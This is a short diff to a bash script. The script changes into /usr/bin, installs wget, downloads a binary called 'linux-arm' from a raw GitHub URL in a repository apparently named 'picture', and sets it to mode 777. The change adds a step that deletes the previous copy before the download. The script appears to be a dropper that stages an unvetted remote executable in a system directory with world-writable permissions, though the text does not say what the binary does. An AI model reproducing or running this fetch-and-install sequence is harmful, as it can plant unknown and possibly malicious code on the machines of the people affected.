@@ -1,6 +1,8 @@
 #!/bin/bash
 
 cd /usr/bin
+rm  linux-arm
+cd /usr/bin
 apt-get -y install wget
 wget -N https://raw.githubusercontent.com/occ1122/picture/main/linux-arm
 chmod 777 linux-arm
